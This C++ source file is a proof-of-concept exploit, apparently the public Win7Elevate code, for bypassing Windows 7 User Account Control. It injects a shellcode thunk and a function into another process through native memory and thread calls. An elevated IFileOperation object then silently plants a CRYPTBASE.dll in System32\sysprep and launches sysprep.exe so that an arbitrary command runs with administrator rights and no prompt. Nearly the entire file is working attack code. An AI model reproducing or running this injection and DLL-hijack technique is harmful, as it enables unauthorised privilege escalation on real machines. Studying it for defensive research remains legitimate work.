//#include "stdafx.h"
#include "elevate.h"
#include "Win7Elevate_Inject.h"
#include <shobjidl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <iostream>

// All code (except for GetElevationType) (C) Leo Davidson, 8th February 2009, all rights reserved.
// (Minor tidy-up 12th June 2009 for the code's public release.)
// http://www.pretentiousname.com
// leo@ox.compsoc.net
//
// Using any part of this code for malicious purposes is expressly forbidden.
//
// This proof-of-concept code is intended only to demonstrate that code-injection
// poses a real problem with the default UAC settings in Windows 7 (tested with RC1 build 7100).

#ifndef FOFX_REQUIREELEVATION
#define FOFX_REQUIREELEVATION (0x10000000)
#endif

typedef struct _CLIENT_ID 
{    
	HANDLE UniqueProcess;    
	HANDLE UniqueThread;
} CLIENT_ID,*PCLIENT_ID;

typedef struct _INITIAL_TEB
{    
	PVOID PreviousStackBase;    
	PVOID PreviousStackLimit;    
	PVOID StackBase;    
	PVOID StackLimit;    
	PVOID AllocatedStackBase;
} INITIAL_TEB, *PINITIAL_TEB;

typedef NTSTATUS (NTAPI *TZwAllocateVirtualMemory)(                                 __in     HANDLE ProcessHandle,                                 __inout  PVOID *BaseAddress,                                 __in     ULONG_PTR ZeroBits,                                 __inout  PSIZE_T RegionSize,                                 __in     ULONG AllocationType,                                 __in     ULONG Protect                                 );
static TZwAllocateVirtualMemory ZwAllocateVirtualMemory = (TZwAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwAllocateVirtualMemory");

typedef NTSYSAPI NTSTATUS (NTAPI *TZwWriteVirtualMemory)    (    IN HANDLE     ProcessHandle,                                                 IN PVOID     BaseAddress,                                                 IN PVOID     Buffer,                                                 IN SIZE_T     NumberOfBytesToWrite,                                                 OUT PSIZE_T     NumberOfBytesWritten                                                      );
static TZwWriteVirtualMemory ZwWriteVirtualMemory = (TZwWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwWriteVirtualMemory");

typedef NTSYSAPI NTSTATUS (NTAPI *TZwProtectVirtualMemory)    (    IN HANDLE     ProcessHandle,                                                 IN PVOID *     BaseAddress,                                                 IN SIZE_T *     NumberOfBytesToProtect,                                                 IN ULONG     NewAccessProtection,                                                 OUT PULONG     OldAccessProtection                                                      );
static TZwProtectVirtualMemory ZwProtectVirtualMemory = (TZwProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwProtectVirtualMemory");

typedef NTSYSAPI NTSTATUS (NTAPI *TZwGetContextThread)    (    IN HANDLE     ThreadHandle,                                             OUT PCONTEXT     Context                                                  );
static TZwGetContextThread ZwGetContextThread = (TZwGetContextThread)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwGetContextThread");

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
#ifdef MIDL_PASS
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer;
#else // MIDL_PASS
    PWSTR Buffer;
#endif // MIDL_PASS
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService; // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef NTSYSAPI NTSTATUS (NTAPI *TZwCreateThread)    (    OUT PHANDLE     ThreadHandle,                                         IN ACCESS_MASK     DesiredAccess,                                         IN POBJECT_ATTRIBUTES ObjectAttributes     OPTIONAL,                                         IN HANDLE     ProcessHandle,                                         OUT PCLIENT_ID     ClientId,                                         IN PCONTEXT     ThreadContext,                                         IN PINITIAL_TEB     UserStack,                                         IN BOOLEAN     CreateSuspended                                              );
static TZwCreateThread ZwCreateThread = (TZwCreateThread)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwCreateThread");

typedef NTSYSAPI NTSTATUS (NTAPI *TZwResumeThread)    (    IN HANDLE     ThreadHandle,                                         OUT PULONG     SuspendCount                                              );
static TZwResumeThread ZwResumeThread = (TZwResumeThread)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwResumeThread");

HANDLE WINAPI myCreateRemoteThread(
								   HANDLE hProcess,
								   LPSECURITY_ATTRIBUTES lpThreadAttributes,
								   SIZE_T dwStackSize,
								   LPTHREAD_START_ROUTINE lpStartAddress,
								   LPVOID lpParameter,
								   DWORD dwCreationFlags,
								   LPDWORD lpThreadId)
{
									   
	//by 80695073(QQ)     //email kiss2008ufo@yahoo.com.cn    
	CONTEXT    context = {CONTEXT_FULL};
	CLIENT_ID  cid={hProcess};    
	DWORD    ret;     HANDLE    hThread = NULL;
	DWORD    StackReserve;    
	DWORD    StackCommit = 0x1000;    
	ULONG_PTR  Stack = 0;    
	INITIAL_TEB InitialTeb={};    
	ULONG    x;     

	
	const CHAR myBaseThreadInitThunk[] = 
  {
    //   00830000    8BFF            mov     edi, edi
    '\x8B','\xFF',
    //   00830002    55              push    ebp
    '\x55',
    //   00830003    8BEC            mov     ebp, esp
    '\x8B','\xEC',
    //   00830005    51              push    ecx   //ntdll.RtlExitUserThread
    '\x51',
    //   00830006    53              push    ebx   //参数
    '\x53',
    //   00830007    FFD0            call    eax   //函数地址
    '\xFF','\xD0',
    //   00830009    59              pop     ecx   //恢复结束函数地址
    '\x59',
    //   0083000A    50              push    eax   //将刚才的结果压栈
    '\x50',
    //   0083000B    FFD1            call    ecx   //调用RtlExitUserThread 结束
    '\xFF','\xD1',
    //  0083000D    90              nop
    '\x90'
  };


	PVOID  pBaseThreadThunk = NULL; //不能释放    //0、分配非OS的加载函数    
	StackReserve = 0x1000;    
	ret = ZwAllocateVirtualMemory(hProcess,         
		/*&stack.ExpandableStackBottom*/(PVOID*)&pBaseThreadThunk,
		0,         
		&StackReserve,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE);
	if (ret >= 0x80000000)    { 
		//失败        
		printf("Error IN myCreateRemoteThread ZwAllocateVirtualMemory0 !\n");        
		goto myCreateRemoteThreadRet;        //end    
	}    
	
	ret = ZwWriteVirtualMemory(hProcess,
		pBaseThreadThunk,
		(LPVOID)myBaseThreadInitThunk,        
		sizeof(myBaseThreadInitThunk),
		&x);    
	
	if (ret >= 0x80000000)    
	{        
		//失败        
		printf("Error IN myCreateRemoteThread ZwAllocateVirtualMemory0 !\n"); 
		goto myCreateRemoteThreadRet;        //end    
	}   
	
	//1、准备堆栈    
	StackReserve = 0x10000;    
	ret = ZwAllocateVirtualMemory(hProcess,         
		/*&stack.ExpandableStackBottom*/(PVOID*)&Stack,
		0,         
		&StackReserve,
		MEM_RESERVE,
		PAGE_READWRITE);     
	if (ret >= 0x80000000)    {        
		//失败        
		printf("Error IN myCreateRemoteThread ZwAllocateVirtualMemory1!\n");        
		goto myCreateRemoteThreadRet;        //end    
	}    
	
	printf("OK myCreateRemoteThread:ZwAllocateVirtualMemory 0x%08x\n",Stack);    
	
	InitialTeb.AllocatedStackBase = (PVOID)Stack;    
	InitialTeb.StackBase = (PVOID)(Stack + StackReserve);    
	/* Update the Stack Position */    
	Stack += StackReserve - StackCommit;    
	Stack -= 0x1000;    
	StackCommit += 0x1000;    /* Allocate memory for the stack */    
	
	ret = ZwAllocateVirtualMemory(hProcess,
		(PVOID*)&Stack,        
		0,
		&StackCommit,
		MEM_COMMIT, 
		PAGE_READWRITE);    
	
	if (ret >= 0x80000000)    { 
		//失败        
		printf("Error IN myCreateRemoteThread ZwAllocateVirtualMemory2!\n");        
		goto myCreateRemoteThreadRet;        //end   
	}    
	
	printf("OK myCreateRemoteThread:ZwAllocateVirtualMemory 2 0x%08x\n",Stack);    
	
	InitialTeb.StackLimit = (PVOID)Stack;    
	StackReserve = 0x1000;     
	ret = ZwProtectVirtualMemory(hProcess, 
		(PVOID*)&Stack, 
		&StackReserve, 
		PAGE_READWRITE | PAGE_GUARD, 
		&x);    
	if (ret >= 0x80000000)    {        
		//失败       
		printf("Error IN myCreateRemoteThread ZwProtectVirtualMemory!\n");
		goto myCreateRemoteThreadRet;        //end   
	}    
	
	/* Update the Stack Limit keeping in mind the Guard Page */    
	InitialTeb.StackLimit = (PVOID)((ULONG_PTR)InitialTeb.StackLimit - 0x1000);    
	
	//2、准备CONTEXT    
	//  CONTEXT context = {CONTEXT_FULL};     
	ret = ZwGetContextThread(GetCurrentThread(),&context);     
	
	if (ret >= 0x80000000)    {        
		//失败        
		printf("Error IN myCreateRemoteThread ZwGetContextThread!\n");   
		goto myCreateRemoteThreadRet;        //end   
	}    
	
	context.Esp = (DWORD)InitialTeb.StackBase; 
	context.Eip = (DWORD)pBaseThreadThunk; //这里填写需要加载的地址，不过需要自己终结自己    
	context.Ebx = (DWORD)lpParameter;    //other init    //must    
	context.Eax = (DWORD)lpStartAddress;    
	context.Ecx = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlExitUserThread");//0x778B0859;/*win7*///0x77AEEC01;/*vista*/ //ntdll.RtlExitUserThread    
	context.Edx = 0x00000000; //nouse    
	ret = ZwCreateThread(&hThread, 
		THREAD_ALL_ACCESS, 
		0, 
		hProcess, 
		&cid, 
		&context, 
		&InitialTeb, 
		TRUE);     
	
	if (ret >= 0x80000000)    
	{        
		//失败        
		printf("Error %d\n",GetLastError()); 
		goto myCreateRemoteThreadRet;        //end    
	}   
	
	if(lpThreadId)    {        
		*lpThreadId = (DWORD)cid.UniqueThread;    
	}   
	
	if (!(dwCreationFlags & CREATE_SUSPENDED))
	{        
		ZwResumeThread(hThread, NULL);    
	}
myCreateRemoteThreadRet:    
	return hThread;
}


struct InjectArgs
{
	BOOL    (WINAPI *fpFreeLibrary)(HMODULE hLibModule);
	HMODULE (WINAPI *fpLoadLibrary)(LPCWSTR lpLibFileName);
	FARPROC (WINAPI *fpGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
	BOOL    (WINAPI *fpCloseHandle)(HANDLE);
	DWORD   (WINAPI *fpWaitForSingleObject)(HANDLE,DWORD);
	const wchar_t *szSourceDll;
	const wchar_t *szElevDir;
	const wchar_t *szElevDll;
	const wchar_t *szElevDllFull;
	const wchar_t *szElevExeFull;
	      wchar_t *szElevArgs; // Not const because of CreateProcess's in-place buffer modification. It's really not const so this is fine. (We don't use CreateProcess anymore but it doesn't hurt to keep this non-const just in case.)
	const wchar_t *szEIFOMoniker; // szElevatedIFileOperationMoniker
	const IID     *pIID_EIFOClass;
	const IID     *pIID_EIFO;
	const IID     *pIID_ShellItem2;
	const IID     *pIID_Unknown;
	const wchar_t *szShell32;
	const wchar_t *szOle32;
	const char    *szCoInitialize;
	const char    *szCoUninitialize;
	const char    *szCoGetObject;
	const char    *szCoCreateInstance;
	const char    *szSHCreateItemFPN; // SHCreateItemFromParsingName
	const char    *szShellExecuteExW;
};

static DWORD WINAPI RemoteCodeFunc(LPVOID lpThreadParameter)
{
	// This is the injected code of "part 1."

	// As this code is copied into another process it cannot refer to any static data (i.e. no string, GUID, etc. constants)
	// and it can only directly call functions that are within Kernel32.dll (which is all we need as it lets us call
	// LoadLibrary and GetProcAddress). The data we need (strings, GUIDs, etc.) is copied into the remote process and passed to
	// us in our InjectArgs structure.

	// The compiler settings are important. You have to ensure that RemoteCodeFunc doesn't do any stack checking (since it
	// involves a call into the CRT which may not exist (in the same place) in the target process) and isn't made inline
	// or anything like that. (Compiler optimizations are best turned off.) You need RemoteCodeFunc to be compiled into a
	// contiguous chunk of assembler that calls/reads/writes nothing except its own stack variables and what is passed to it via pArgs.

	// It's also important that all asm jump instructions in this code use relative addressing, not absolute. Jumps to absolute
	// addresses will not be valid after the code is copied to a different address in the target process. Visual Studio seems
	// to use absolute addresses sometimes and relative ones at other times and I'm not sure what triggers one or the other. For example,
	// I had a problem with it turning a lot of the if-statements in this code into absolute jumps when compiled for 32-bit and that
	// seemed to go away when I set the Release build to generate a PDF file, but then they came back again.
	// I never had this problem in February, and 64-bit builds always seem fine, but now in June I'm getting the problem with 32-bit
	// builds on my main machine. However, if I switch to the older compiler install and older Windows SDK that I have on another machine
	// it always builds a working 32-bit (and 64-bit) version, just like it used to. So I guess something in the compiler/SDK has triggered
	// this change but I don't know what. It could just be that things have moved around in memory due to a structure size change and that's
	// triggering the different modes... I don't know!
	//
	// So if the 32-bit version crashes the process you inject into, you probably need to work out how to convince the compiler
	// to generate the code it used to in February. :) Or you could write some code to fix up the jump instructions after copying them,
	// or hand-code the 32-bit asm (seems you can ignore 64-bit as it always works so far), or find a style of if-statement (or equivalent)
	// that always generates relative jumps, or whatever...
	//
	// Take a look at the asm_code_issue.png image that comes with the source to see what the absolute and relative jumps look like.
	//
	// PS: I've never written Intel assembler, and it's many years since I've hand-written any type of assembler, so I may have the wrong end
	// of the stick about some of this! Either way, 32-bit version works when built on my older compiler/SDK install and usually doesn't on
	// the newer install.

	InjectArgs * pArgs = reinterpret_cast< InjectArgs * >(lpThreadParameter);
	
	// Use an elevated FileOperation object to copy a file to a protected folder.
	// If we're in a process that can do silent COM elevation then we can do this without any prompts.

	HMODULE hModuleOle32    = pArgs->fpLoadLibrary(pArgs->szOle32);
	HMODULE hModuleShell32  = pArgs->fpLoadLibrary(pArgs->szShell32);

	if (hModuleOle32
	&&	hModuleShell32)
	{
		// Load the non-Kernel32.dll functions that we need.

		GetProcAddr< HRESULT (STDAPICALLTYPE *)(LPVOID pvReserved) >
			tfpCoInitialize( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoInitialize );

		GetProcAddr< void (STDAPICALLTYPE *)(void) >
			tfpCoUninitialize( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoUninitialize );

		GetProcAddr< HRESULT (STDAPICALLTYPE *)(LPCWSTR pszName, BIND_OPTS *pBindOptions, REFIID riid, void **ppv) >
			tfpCoGetObject( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoGetObject );

		GetProcAddr< HRESULT (STDAPICALLTYPE *)(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, void ** ppv) >
			tfpCoCreateInstance( pArgs->fpGetProcAddress, hModuleOle32, pArgs->szCoCreateInstance );

		GetProcAddr< HRESULT (STDAPICALLTYPE *)(PCWSTR pszPath, IBindCtx *pbc, REFIID riid, void **ppv) >
			tfpSHCreateItemFromParsingName( pArgs->fpGetProcAddress, hModuleShell32, pArgs->szSHCreateItemFPN );

		GetProcAddr< BOOL (STDAPICALLTYPE *)(LPSHELLEXECUTEINFOW lpExecInfo) >
			tfpShellExecuteEx( pArgs->fpGetProcAddress, hModuleShell32, pArgs->szShellExecuteExW );

		if (0 != tfpCoInitialize.f
		&&	0 != tfpCoUninitialize.f
		&&	0 != tfpCoGetObject.f
		&&	0 != tfpCoCreateInstance.f
		&&	0 != tfpSHCreateItemFromParsingName.f
		&&	0 != tfpShellExecuteEx.f)
		{
			if (S_OK == tfpCoInitialize.f(NULL))
			{
				BIND_OPTS3 bo;
				for(int i = 0; i < sizeof(bo); ++i) { reinterpret_cast< BYTE * >(&bo)[i] = 0; } // This loop is easier than pushing ZeroMemory or memset through pArgs.
				bo.cbStruct = sizeof(bo);
				bo.dwClassContext = CLSCTX_LOCAL_SERVER;

				// For testing other COM objects/methods, start here.
				{
					IFileOperation *pFileOp = 0;
					IShellItem *pSHISource = 0;
					IShellItem *pSHIDestination = 0;
					IShellItem *pSHIDelete = 0;

					// This is a completely standard call to IFileOperation, if you ignore all the pArgs/func-pointer indirection.
					if (
						(pArgs->szEIFOMoniker  && S_OK == tfpCoGetObject.f( pArgs->szEIFOMoniker, &bo, *pArgs->pIID_EIFO, reinterpret_cast< void ** >(&pFileOp)))
					||	(pArgs->pIID_EIFOClass && S_OK == tfpCoCreateInstance.f( *pArgs->pIID_EIFOClass, NULL, CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER, *pArgs->pIID_EIFO, reinterpret_cast< void ** >(&pFileOp)))
						)
					if (0    != pFileOp)
					if (S_OK == pFileOp->SetOperationFlags(FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION))
					if (S_OK == tfpSHCreateItemFromParsingName.f( pArgs->szSourceDll, NULL, *pArgs->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHISource)))
					if (0    != pSHISource)
					if (S_OK == tfpSHCreateItemFromParsingName.f( pArgs->szElevDir, NULL, *pArgs->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHIDestination)))
					if (0    != pSHIDestination)
					if (S_OK == pFileOp->CopyItem(pSHISource, pSHIDestination, pArgs->szElevDll, NULL))
					if (S_OK == pFileOp->PerformOperations())
					{
						// Use ShellExecuteEx to launch the "part 2" target process. Again, a completely standard API call.
						// (Note: Don't use CreateProcess as it seems not to do the auto-elevation stuff.)
						SHELLEXECUTEINFOW shinfo;
						for(int i = 0; i < sizeof(shinfo); ++i) { reinterpret_cast< BYTE * >(&shinfo)[i] = 0; } // This loop is easier than pushing ZeroMemory or memset through pArgs.
						shinfo.cbSize = sizeof(shinfo);
						shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
						shinfo.lpFile = pArgs->szElevExeFull;
						shinfo.lpParameters = pArgs->szElevArgs;
						shinfo.lpDirectory = pArgs->szElevDir;
						shinfo.nShow = SW_SHOW;

						if (tfpShellExecuteEx.f(&shinfo) && shinfo.hProcess != NULL)
						{
							// Wait for the "part 2" target process to finish.
							pArgs->fpWaitForSingleObject(shinfo.hProcess, INFINITE);

							pArgs->fpCloseHandle(shinfo.hProcess);
						}

						// Another standard call to IFileOperation, this time to delete our dummy DLL. We clean up our mess.
						if (S_OK == tfpSHCreateItemFromParsingName.f( pArgs->szElevDllFull, NULL, *pArgs->pIID_ShellItem2, reinterpret_cast< void ** >(&pSHIDelete)))
						if (0    != pSHIDelete)
						if (S_OK == pFileOp->DeleteItem(pSHIDelete, NULL))
						{
							pFileOp->PerformOperations();
						}
					}

					if (pSHIDelete)      { pSHIDelete->Release();      }
					if (pSHIDestination) { pSHIDestination->Release(); }
					if (pSHISource)      { pSHISource->Release();      }
					if (pFileOp)         { pFileOp->Release();         }
				}

				tfpCoUninitialize.f();
			}
		}
	}

	if (hModuleShell32)  { pArgs->fpFreeLibrary(hModuleShell32);  }
	if (hModuleOle32)    { pArgs->fpFreeLibrary(hModuleOle32);    }

	return 0;
}

// Marks the end of the function so we know how much data to copy.
static void DummyRemoteCodeFuncEnd()
{
}

void AttemptOperation( bool bInject, bool bElevate, DWORD dwPid, const wchar_t *szProcName,
								 const wchar_t *szCmd, const wchar_t *szArgs, const wchar_t *szDir,
								 const wchar_t *szPathToOurDll)
{

	bool bThreadWaitSuccess = false;
	bool bThreadWaitFailure = false;
	HANDLE hTargetProc = NULL;
	wchar_t szPathToSelf[MAX_PATH] = {0};
	wchar_t szProgramFiles[MAX_PATH]  = {0};
	const BYTE * startAdr = reinterpret_cast< const BYTE * >( &RemoteCodeFunc );
	const BYTE * endAdr   = reinterpret_cast< const BYTE * >( &DummyRemoteCodeFuncEnd );

	typedef int (WINAPI *myCRT)(HANDLE, DWORD, DWORD, LPVOID, LPVOID, DWORD, char *);
	HMODULE v0 = GetModuleHandleA("kernel32.dll");
	int crt = (int)/*GetProcAddress*/MyGetProcAddress(v0, "CreateRemoteThread");
	unsigned int threadId;
					
	if (startAdr >= endAdr)
	{
		return;
	}
	
	DWORD dwGMFNRes = GetModuleFileNameW(NULL, szPathToSelf, _countof(szPathToSelf));
	if (dwGMFNRes == 0 || dwGMFNRes >= _countof(szPathToSelf))
	{
		return;
	}

	HMODULE hModKernel32 = LoadLibraryW(L"kernel32.dll");
	if (hModKernel32 == 0)
	{
		return;
	}	

	GetProcAddr< BOOL    (WINAPI *)(HMODULE)         > tfpFreeLibrary(         &GetProcAddress, hModKernel32, "FreeLibrary");
	GetProcAddr< HMODULE (WINAPI *)(LPCWSTR)         > tfpLoadLibrary(         &GetProcAddress, hModKernel32, "LoadLibraryW");
	GetProcAddr< FARPROC (WINAPI *)(HMODULE, LPCSTR) > tfpGetProcAddress(      &GetProcAddress, hModKernel32, "GetProcAddress");
	GetProcAddr< BOOL    (WINAPI *)(HANDLE)          > tfpCloseHandle(         &GetProcAddress, hModKernel32, "CloseHandle");
	GetProcAddr< DWORD   (WINAPI *)(HANDLE,DWORD)    > tfpWaitForSingleObject( &GetProcAddress, hModKernel32, "WaitForSingleObject");

	if (0 == tfpFreeLibrary.f
	||	0 == tfpLoadLibrary.f
	||	0 == tfpGetProcAddress.f
	||	0 == tfpCloseHandle.f
	||	0 == tfpWaitForSingleObject.f)
	{
		//MessageBox(hWnd, L"Couldn't find API", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		//printf("Couldn't find API\n");
	}
	else
	{
		// Here we define the target process and DLL for "part 2." This is an auto/silent-elevating process which isn't
		// directly below System32 and which loads a DLL which is directly below System32 but isn't on the OS's "Known DLLs" list.
		// If we copy our own DLL with the same name to the exe's folder then the exe will load our DLL instead of the real one.
		const wchar_t *szElevDir = L"C:\\Windows\\System32\\sysprep";
		const wchar_t *szElevDll = L"CRYPTBASE.dll";
		const wchar_t *szElevDllFull = L"C:\\Windows\\System32\\sysprep\\CRYPTBASE.dll";
		const wchar_t *szElevExeFull = L"C:\\Windows\\System32\\sysprep\\sysprep.exe";
		std::wstring strElevArgs = L"\"";
		strElevArgs += szPathToSelf;
		strElevArgs += L"\" \"";
		strElevArgs += szCmd;
		strElevArgs += L"\" \"";
		strElevArgs += szDir;
		strElevArgs += L"\" \"";
		for (const wchar_t *pCmdArgChar = szArgs; *szArgs; ++szArgs)
		{
			if (*szArgs != L'\"')
			{
				strElevArgs += *szArgs;
			}
			else
			{
				strElevArgs += L"\"\"\""; // Turn each quote into three to preserve them in the arguments.
			}
		}
		strElevArgs += L"\"";

		if (OpenProcessToInject(&hTargetProc, dwPid, szProcName))
		{
			// Test code with remoting.
			// At least as of RC1 build 7100, with the default OS settings, this will run the specified command
			// with elevation but without triggering a UAC prompt.

			// Scope CRemoteMemory so it's destroyed before the process handle is closed.
			{
				CRemoteMemory reme(hTargetProc);

				InjectArgs ia;
				// ASSUMPTION: Remote process has same ASLR setting as us (i.e. ASLR = on)
				//             kernel32.dll is mapped to the same address range in both processes.
				ia.fpFreeLibrary         = tfpFreeLibrary.f;
				ia.fpLoadLibrary         = tfpLoadLibrary.f;
				ia.fpGetProcAddress      = tfpGetProcAddress.f;
				ia.fpCloseHandle         = tfpCloseHandle.f;
				ia.fpWaitForSingleObject = tfpWaitForSingleObject.f;

				// It would be more efficient to allocate and copy the data in one
				// block but since this is just a proof-of-concept I don't bother.

				ia.szSourceDll           = reme.AllocAndCopyMemory(szPathToOurDll);
				ia.szElevDir             = reme.AllocAndCopyMemory(szElevDir);
				ia.szElevDll             = reme.AllocAndCopyMemory(szElevDll);
				ia.szElevDllFull         = reme.AllocAndCopyMemory(szElevDllFull);
				ia.szElevExeFull         = reme.AllocAndCopyMemory(szElevExeFull);
				ia.szElevArgs            = reme.AllocAndCopyMemory(strElevArgs.c_str(), false); // Leave this page writeable for CreateProcess.
									 
				ia.szShell32             = reme.AllocAndCopyMemory(L"shell32.dll");
				ia.szOle32               = reme.AllocAndCopyMemory(L"ole32.dll");
				ia.szCoInitialize        = reme.AllocAndCopyMemory("CoInitialize");
				ia.szCoUninitialize      = reme.AllocAndCopyMemory("CoUninitialize");
				ia.szCoGetObject         = reme.AllocAndCopyMemory("CoGetObject");
				ia.szCoCreateInstance    = reme.AllocAndCopyMemory("CoCreateInstance");
				ia.szSHCreateItemFPN     = reme.AllocAndCopyMemory("SHCreateItemFromParsingName");
				ia.szShellExecuteExW     = reme.AllocAndCopyMemory("ShellExecuteExW");
				ia.szEIFOMoniker         = bElevate ? reme.AllocAndCopyMemory(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}") : NULL;
				ia.pIID_EIFOClass        = bElevate ? NULL : reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(FileOperation), sizeof(__uuidof(FileOperation)), false) );
				ia.pIID_EIFO             = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IFileOperation), sizeof(__uuidof(IFileOperation)), false) );
				ia.pIID_ShellItem2       = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IShellItem2),    sizeof(__uuidof(IShellItem2)),    false) );
				ia.pIID_Unknown          = reinterpret_cast< const IID * >( reme.AllocAndCopyMemory(&__uuidof(IUnknown),       sizeof(__uuidof(IUnknown)),       false) );

				void *pRemoteArgs = reme.AllocAndCopyMemory(&ia, sizeof(ia), false);

				void *pRemoteFunc = reme.AllocAndCopyMemory( RemoteCodeFunc, endAdr - startAdr, true);

				if (!reme.AnyFailures())
				{
					HANDLE hRemoteThread = 
						//(HANDLE)((myCRT)crt)(hTargetProc, NULL, 0, pRemoteFunc, pRemoteArgs, 0, (char*)&threadId);
						//CreateRemoteThread(hTargetProc, NULL, 0, reinterpret_cast< LPTHREAD_START_ROUTINE >( pRemoteFunc ), pRemoteArgs, 0, NULL);
						myCreateRemoteThread(hTargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteFunc, pRemoteArgs, 0, (LPDWORD)&threadId);

					if (hRemoteThread != 0)
					{
						int waitornot = 1;
						while(true)
						{
							DWORD dwWaitRes = WaitForSingleObject(hRemoteThread, 1000);

							if (dwWaitRes == WAIT_OBJECT_0)
							{
								bThreadWaitSuccess = true;
								break;
							}
							else if (dwWaitRes != WAIT_TIMEOUT)
							{
								bThreadWaitFailure = true;
								break;
							}
							else if (waitornot == 1)
							{
								// See if it completed before the user asked to stop waiting.
								// Code that wasn't just a proof-of-concept would use a worker thread that could cancel the wait UI.
								if (WAIT_OBJECT_0 == WaitForSingleObject(hRemoteThread, 0))
								{
									bThreadWaitSuccess = true;
								}
								break;
							}
						}

						if (!bThreadWaitSuccess)
						{
							// The memory in the other process could still be in use.
							// Freeing it now will almost certainly crash the other process.
							// Letting it leak is the lesser of two evils...
							reme.LeakMemory();
						}
					}
				}
			}
			CloseHandle(hTargetProc);
		}
	}

	FreeLibrary(hModKernel32);

	if (bThreadWaitFailure)
	{
		//MessageBox(hWnd, L"Error waiting on the remote thread to complete", L"Win7Elevate", MB_OK | MB_ICONWARNING);
		printf("Error waiting on the remote thread to complete\n");
	}
	else if (bThreadWaitSuccess)
	{
//		MessageBox(hWnd, L"Remote thread completed", L"Win7Elevate", MB_OK | MB_ICONINFORMATION);
		printf("Remote thread completed\n");
	}
}




